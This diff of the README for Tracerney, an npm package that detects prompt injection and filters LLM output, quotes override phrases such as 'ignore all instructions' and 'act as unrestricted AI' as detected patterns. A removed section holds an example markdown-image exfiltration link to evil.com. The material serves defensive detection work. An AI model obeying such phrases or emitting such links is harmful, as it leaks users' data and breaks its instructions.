@@ -1,6 +1,6 @@
 # Tracerney
 
-Lightweight prompt injection detection and outbound PII/secret filtering for LLM applications. Runs 100% locally with zero data leaving your server.
+Lightweight prompt injection detection for LLM applications. Runs 100% locally with zero data leaving your server.
 
 > 🚀 **Explore the full platform at [tracerney.com](https://www.tracerney.com)** — includes dashboard, analytics, API management, and team collaboration tools.
 
@@ -10,21 +10,187 @@ Lightweight prompt injection detection and outbound PII/secret filtering for LLM
 npm install @sandrobuilds/tracerney
 ```
 
----
-
-## Layer 1: The Deterministic Filter
-
-A high-speed, synchronous sensor that scans every LLM **response** before it reaches your user. Target latency: **<5ms**. No LLM needed — pure regex.
-
-The SDK never decides for you. It labels every finding and hands you the keys.
-
-### The `validate()` API
+## Usage
 
 ```typescript
 import { Tracerney } from '@sandrobuilds/tracerney';
 
-const tracerney = new Tracerney();
+const tracer = new Tracerney();
 
+const result = await tracer.scanPrompt(userInput);
+
+if (result.suspicious) {
+  console.log('⚠️ Suspicious:', result.patternName);
+  // Handle flagged prompt (log, block, rate-limit, etc.)
+}
+```
+
+## What's Included
+
+- **258 embedded attack patterns** — real-world injection techniques detected in real-time
+- **Local detection** — <5ms latency per prompt, zero network overhead
+- **Zero dependencies** — single npm package
+- **Privacy-first** — no data leaves your server, 100% local processing
+
+## Result Object
+
+### Layer 1 (Pattern Detection)
+```typescript
+{
+  suspicious: boolean;     // true if pattern matched
+  patternName?: string;    // e.g., "Ignore Instructions"
+  severity?: string;       // "CRITICAL" | "HIGH" | "MEDIUM" | "LOW"
+  blocked: boolean;        // false (Layer 1 only marks suspicious)
+}
+```
+
+### Layer 2 (LLM Sentinel)
+```typescript
+{
+  action: "BLOCK" | "ALLOW";     // Final decision from LLM Sentinel
+  confidence: number;             // 0.0 to 1.0 confidence score
+  class: string;                  // Threat classification (e.g., "jailbreak_llm_detected")
+  fingerprint: string;            // Unique threat identifier for tracking
+}
+```
+
+## Detected Patterns
+
+- Instruction overrides ("ignore all instructions")
+- Role-play jailbreaks ("act as unrestricted AI")
+- Hypothetical constraint bypass ("what would you do without constraints?")
+- Context confusion attacks
+- Data extraction attempts
+- Code execution risks
+- And 254 more...
+
+## Multi-Layer Runtime Defense
+
+**Layer 1:** Pattern Matching (Always Free)
+- 258 real-world attack patterns in real-time
+- <5ms detection on modern hardware
+- Zero network overhead
+- Local processing only
+- Detects: instruction overrides, role-play jailbreaks, context confusion, code execution risks, data extraction attempts, and more
+
+**Layer 2:** LLM Sentinel (Pro - $9/month)
+- **AI-powered response verification** — LLM-based analysis for novel attack patterns
+- **Context-aware scanning** — understands your application's specific security policies
+- **Delimiter salting** — prevents prompt injection through response boundaries
+- **Zero prompt storage** — responses are analyzed in-memory, never saved or logged
+- **Structured threat metadata** — detailed fingerprints for audit trails and tracking
+- **Advanced rate limiting** — prevents cost spikes with intelligent throttling
+
+## Layer 2: LLM Sentinel Deep Dive
+
+Layer 2 adds advanced security with LLM Sentinel, an AI-powered verification system that analyzes LLM responses for injection patterns and validates output safety. Combines local pattern detection (Layer 1) with server-side verification for defense-in-depth protection.
+
+### How Layer 1 & Layer 2 Work Together
+
+| **Layer 1: Pattern Detection (Free SDK)** | **Layer 2: LLM Sentinel (Pro)** |
+|---|---|
+| Local pattern matching | Server-side verification |
+| 258 attack patterns | Output validation |
+| <5ms latency | JSON safety checks |
+| No data leaves device | Delimiter salting |
+| Zero network calls | Context-aware analysis |
+
+### Enabling Layer 2
+
+Initialize Tracerney with Layer 2 LLM Sentinel (Pro plan required):
+
+```typescript
+const tracer = new Tracerney({
+  apiKey: process.env.TRACERNEY_API_KEY,
+  sentinelEnabled: true,
+});
+```
+
+That's it! Layer 2 is automatically configured to use the hosted LLM Sentinel service. Your API key authenticates requests and verifies your Pro subscription.
+
+### Custom Layer 2 Configuration (Advanced)
+
+Want to self-host Layer 2 or use a custom implementation? Override the sentinel endpoint:
+
+```typescript
+const tracer = new Tracerney({
+  apiKey: process.env.TRACERNEY_API_KEY,
+  sentinelEnabled: true,
+  baseUrl: process.env.TRACERNEY_BASE_URL, // e.g., http://localhost:3000 or https://myapp.com
+  sentinelEndpoint: process.env.TRACERNEY_SENTINEL_ENDPOINT, // e.g., /api/v1/verify-prompt
+});
+```
+
+**Self-hosting Layer 2?** You can build your own verification endpoint using the same pattern as our hosted service. Contact support for self-hosting guidance.
+
+### Scanning with Layer 2
+
+With Layer 2 enabled, `scanPrompt` validates both input and LLM responses. Handle errors appropriately:
+
+```typescript
+try {
+  // Scan input (Layer 1 + Layer 2)
+  const result = await tracer.scanPrompt(userInput);
+  // If we get here, input is safe. Call LLM
+  const llmResponse = await llm.chat(userInput);
+  // Verify LLM output wasn't compromised
+  const outputCheck = await tracer.verifyOutput(llmResponse);
+  return llmResponse;
+} catch (err) {
+  if (err instanceof ShieldBlockError) {
+    return NextResponse.json(
+      { error: "Input content is flagged as suspicious" },
+      { status: 400 }
+    );
+  }
+  throw err;
+}
+```
+
+### API Response Format
+
+The verify-prompt endpoint returns structured responses. Success (HTTP 200) includes classification, confidence, and fingerprint. Errors include specific error codes and messages.
+
+#### ✅ Content is Safe (HTTP 200)
+```json
+{
+  "action": "ALLOW",
+  "confidence": 0.15,
+  "class": "safe_content",
+  "fingerprint": "a3f7k2"
+}
+```
+
+#### 🔴 Content is Blocked (HTTP 200)
+```json
+{
+  "action": "BLOCK",
+  "confidence": 0.99,
+  "class": "jailbreak_semantic_pattern",
+  "fingerprint": "c1p5n3"
+}
+```
+
+#### ⚠️ Quota Exceeded (HTTP 402)
+```json
+{
+  "blocked": true,
+  "reason": "scan_limit_exceeded",
+  "scansUsed": 50,
+  "limit": 50,
+  "message": "Free plan limit reached (50/month)..."
+}
+```
+
+---
+
+## Outbound Response Filtering: `validate()`
+
+Layer 1 also runs on every LLM **response** before it reaches your user — scanning for PII, secrets, and active exfiltration attempts embedded in agent output.
+
+The SDK is a high-precision sensor. It never decides for you. It labels every finding and hands you the keys:
+
+```typescript
 const trace = tracerney.validate(agentOutput);
 
 if (trace.isSuspicious) {
@@ -35,169 +201,49 @@ if (trace.isSuspicious) {
     throw new Error('Security Policy Violation');
   }
 
-  // Option B: Surgical scrub — return pre-computed redacted version
+  // Option B: Surgical scrub
   return trace.redactedContent;
 }
 ```
 
-### The Suspicious Manifest
-
-Every finding is labeled so you can route your own reaction:
-
-| Trigger | Label | `redactedContent` token | Recommended action |
-|---|---|---|---|
-| Email / Phone | `SUSPICIOUS_PII` | `[SUSPICIOUS_PII:EMAIL]` | Usually Redact |
-| API Keys / SSH / CC / SSN | `SUSPICIOUS_SECRET` | `[SUSPICIOUS_SECRET:ANTHROPIC_API_KEY]` | Usually Block |
-| External URL smuggling | `SUSPICIOUS_EGRESS` | `[SUSPICIOUS_EGRESS:MARKDOWN_IMAGE_SMUGGLING]` | Always Block |
-| Zero-width / BiDi / Base64 | `SUSPICIOUS_ENCODING` | `[SUSPICIOUS_ENCODING:BIDI_OVERRIDE]` | Audit / Block |
-
-### `SuspiciousTrace` object
-
 ```typescript
-const trace = tracerney.validate(agentOutput);
-
 trace.isSuspicious      // boolean — true if any pattern matched
-trace.label             // 'SUSPICIOUS_PII' | 'SUSPICIOUS_SECRET' | 'SUSPICIOUS_EGRESS' | 'SUSPICIOUS_ENCODING' | null
+trace.label             // see manifest below
 trace.reason            // "Detected 2 finding(s): Email Address, AWS Access Key ID"
-trace.redactedContent   // pre-scrubbed version of the input — use it or throw, your call
+trace.redactedContent   // pre-scrubbed version — use it or throw, your call
 trace.findings          // full per-pattern breakdown for logging/telemetry
 ```
 
-### What Layer 1 detects
+### The Suspicious Manifest
 
-**`SUSPICIOUS_PII`** — Accidental personal data exposure
-- Email addresses
-- US phone numbers
-
-**`SUSPICIOUS_SECRET`** — High-value credential leaks
-- Anthropic, OpenAI, Stripe, GitHub, AWS, Google, Slack, SendGrid, Twilio API keys
-- SSH / PEM private key blocks
-- Credit card numbers (Visa, Mastercard, Amex, Discover)
-- US Social Security Numbers
-
-**`SUSPICIOUS_EGRESS`** — Active data exfiltration attempts
-- Markdown image tags with URL query params: `![x](https://evil.com/log.png?config=secret)`
-- Markdown links smuggling data via query params
-- Credential-embedded URLs: `https://user:password@hostname`
-- Base64 payloads in URL parameters
-
-**`SUSPICIOUS_ENCODING`** — Obfuscation and hidden data
-- Zero-width characters (`\u200B`, `\u200C`, `\uFEFF`, etc.)
-- Unicode bidirectional override characters (BiDi attacks)
-- Standalone base64 blobs (≥120 chars) outside of URLs
-
-### Developer decision guide
-
-```typescript
-const trace = tracerney.validate(agentOutput);
-
-if (!trace.isSuspicious) {
-  return agentOutput; // clean
-}
-
-switch (trace.label) {
-
-  case 'SUSPICIOUS_PII':
-    // Low risk — agent is being too "talkative"
-    // Redact and continue; don't break the user's flow
-    return trace.redactedContent;
-
-  case 'SUSPICIOUS_SECRET':
-    // High risk — agent leaked a credential
-    // Redact before sending, fire an alert
-    myAlerts.fire({ label: trace.label, reason: trace.reason });
-    return trace.redactedContent;
-
-  case 'SUSPICIOUS_EGRESS':
-    // Critical — agent is trying to exfiltrate data
-    // Kill the process. The caller gets nothing.
-    throw new SecurityError('Egress attack detected');
-
-  case 'SUSPICIOUS_ENCODING':
-    // Critical — hidden/obfuscated payload
-    // Audit and block; send for review
-    myAlerts.fire({ label: trace.label, reason: trace.reason });
-    throw new SecurityError('Encoding attack detected');
-}
-```
+| Trigger | Label | Recommended action |
+|---|---|---|
+| Email / Phone | `SUSPICIOUS_PII` | Usually Redact |
+| API Keys / SSH / CC / SSN | `SUSPICIOUS_SECRET` | Usually Block |
+| External URL smuggling | `SUSPICIOUS_EGRESS` | Always Block |
+| Zero-width / BiDi / Base64 | `SUSPICIOUS_ENCODING` | Audit / Block |
 
 ---
 
-## Layer 1 + LLM Pipeline: `wrap()`
+## Pricing & Usage
 
-If you want automatic protection wired into your LLM call, use `wrap()`. It runs Layer 1 on the response before returning it to you, and applies the same label-based routing:
-
-- `SUSPICIOUS_EGRESS` → throws `ShieldBlockError` (caller gets nothing)
-- `SUSPICIOUS_SECRET` / `SUSPICIOUS_ENCODING` → emits a `PII_LEAK` telemetry event, returns scrubbed response
-- `SUSPICIOUS_PII` → returns scrubbed response silently
-
-```typescript
-const response = await tracerney.wrap(
-  () => openai.chat.completions.create({ model: 'gpt-4o', messages }),
-  { prompt: userInput } // optional: also scan the inbound prompt
-);
-// response.choices[0].message.content is already scrubbed
-```
+- **Free Tier:** 50 scans/month with Layer 1 pattern detection
+- **Pro Tier:** 2,500 scans/month with Layer 1 + Layer 2 LLM verification ($9/month)
 
 ---
 
-## Layer 2: LLM Sentinel
+## Ready for Advanced Protection?
 
-Layer 2 adds AI-powered verification for novel attack patterns not covered by regex. It runs after Layer 1 marks a prompt suspicious, using a hosted LLM to confirm or clear the threat.
+Layer 2 (LLM Sentinel) adds AI-powered verification with **context-aware** threat detection and **zero prompt storage** — all responses are analyzed in-memory and immediately discarded.
 
-**Layer 1 (Free)** | **Layer 2 (Pro — $9/month)**
----|---
-Local regex, <5ms | Server-side LLM analysis
-258 attack patterns | Context-aware threat detection
-No network calls | Zero prompt storage
-Always on | Activates only on Layer 1 hits
+**[Start Your Free Trial or Upgrade to Pro](https://www.tracerney.com/docs)** at tracerney.com
 
-### Enable Layer 2
-
-```typescript
-const tracerney = new Tracerney({
-  apiKey: process.env.TRACERNEY_API_KEY,
-  sentinelEnabled: true,
-});
-```
-
-### Layer 2 response format
-
-```json
-// Safe
-{ "action": "ALLOW", "confidence": 0.15, "class": "safe_content", "fingerprint": "a3f7k2" }
-
-// Blocked
-{ "action": "BLOCK", "confidence": 0.99, "class": "jailbreak_semantic_pattern", "fingerprint": "c1p5n3" }
-```
-
----
-
-## Inbound prompt scanning: `scanPrompt()`
-
-```typescript
-const result = await tracerney.scanPrompt(userInput);
-
-if (result.suspicious) {
-  console.log('Suspicious:', result.patternName, result.severity);
-}
-```
-
-```typescript
-result.suspicious     // boolean
-result.patternName    // e.g. "Ignore Instructions"
-result.severity       // "CRITICAL" | "HIGH" | "MEDIUM" | "LOW"
-result.blocked        // true only if Layer 2 confirmed the attack
-```
-
----
-
-## Pricing
-
-- **Free:** 50 scans/month — Layer 1 pattern detection
-- **Pro ($9/month):** 2,500 scans/month — Layer 1 + Layer 2 LLM Sentinel
-
-**[Start free or upgrade at tracerney.com](https://www.tracerney.com/docs)**
+Includes:
+- Dashboard with threat analytics
+- API key management
+- Team collaboration features
+- Detailed threat fingerprints for compliance
+- Priority support for Pro members
 
 ---
 
